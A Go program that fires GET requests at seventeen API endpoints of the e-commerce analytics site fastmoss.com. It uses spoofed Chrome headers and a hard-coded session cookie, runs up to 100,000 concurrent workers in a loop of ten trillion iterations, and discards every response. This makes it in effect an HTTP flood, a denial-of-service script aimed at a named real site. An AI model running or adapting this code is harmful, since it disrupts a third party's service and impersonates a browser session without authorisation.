package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"sync"
)

func makeRequest(url string, wg *sync.WaitGroup) {
	defer wg.Done()

	client := &http.Client{}
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}

	req.Header.Add("accept", "*/*")
	req.Header.Add("accept-language", "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7")
	req.Header.Add("cache-control", "no-cache")
	req.Header.Add("cookie", "fd_id=jP8CeEVF5Aln4BkHuTIMrKYpg0DbxGwW; vis_fid=66475f3481dd79993051715953460.5323; fp_visid=3c02d1d6b26a9725fde56fafb2ca313e")
	req.Header.Add("lang", "ZH_CN")
	req.Header.Add("pragma", "no-cache")
	req.Header.Add("priority", "u=1, i")
	req.Header.Add("referer", "https://www.fastmoss.com/zh/e-commerce/saleslist")
	req.Header.Add("sec-ch-ua", "\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"")
	req.Header.Add("sec-ch-ua-mobile", "?0")
	req.Header.Add("sec-ch-ua-platform", "\"Windows\"")
	req.Header.Add("sec-fetch-dest", "empty")
	req.Header.Add("sec-fetch-mode", "cors")
	req.Header.Add("sec-fetch-site", "same-origin")
	req.Header.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36")

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error making request:", err)
		return
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	//_, err = ioutil.ReadAll(resp.Body)
	if body != nil {
		fmt.Println("success!")
	}
	if err != nil {
		fmt.Println("Error reading response:", err)
		return
	}

	//fmt.Println("Response:", string(body))
}

func main() {
	var wg sync.WaitGroup
	urls := []string{
		"https://www.fastmoss.com/api/goods/saleRank?page=1&date_type=3&order=1%2C2&pagesize=5",
		"https://www.fastmoss.com/api/goods/saleRank?page=1&date_type=3&order=6%2C2&pagesize=5",
		"https://www.fastmoss.com/api/goods/saleRank?page=1&date_type=3&order=3%2C2&pagesize=5",
		"https://www.fastmoss.com/api/goods/V2/search?page=1&region=US&order=7%2C2&pagesize=5",
		"https://www.fastmoss.com/api/goods/V2/search?page=1&region=US&order=2%2C2&pagesize=5",
		"https://www.fastmoss.com/api/shop/shopList?page=1&date_type=3&order=1%2C2&pagesize=5",
		"https://www.fastmoss.com/api/shop/shopList?page=1&date_type=2&order=1%2C2&pagesize=5",
		"https://www.fastmoss.com/api/shop/shopList?page=1&date_type=1&order=1%2C2&pagesize=5",
		"https://www.fastmoss.com/api/shop/shopPopList?page=1&date_type=1&order=4%2C2&pagesize=5",
		"https://www.fastmoss.com/api/shop/shopPopList?page=1&date_type=2&order=4%2C2&pagesize=5",
		"https://www.fastmoss.com/api/shop/shopPopList?page=1&date_type=3&order=4%2C2&pagesize=5",
		"https://www.fastmoss.com/api/shop/sShopList?page=1&date_type=1&region=US&order=6%2C2&pagesize=5",
		"https://www.fastmoss.com/api/shop/sShopList?page=1&date_type=2&region=US&order=6%2C2&pagesize=5",
		"https://www.fastmoss.com/api/shop/sShopList?page=1&date_type=3&region=US&order=6%2C2&pagesize=5",
		"https://www.fastmoss.com/api/followers/followersList?page=1&type=1&date_type=1&order=1%2C2&pagesize=5",
		"https://www.fastmoss.com/api/followers/followersList?page=1&type=1&date_type=2&order=1%2C2&pagesize=5",
		"https://www.fastmoss.com/api/followers/followersList?page=1&type=1&date_type=3&order=1%2C2&pagesize=5",
	}

	// Number of concurrent workers
	const workers = 100000
	sem := make(chan struct{}, workers)

	for i := 0; i < 10000000000000; i++ {
		for _, url := range urls {
			wg.Add(1)
			sem <- struct{}{}
			go func(url string) {
				defer func() { <-sem }()
				makeRequest(url, &wg)
			}(url)
		}
	}

	wg.Wait()
	fmt.Println("结束")
}
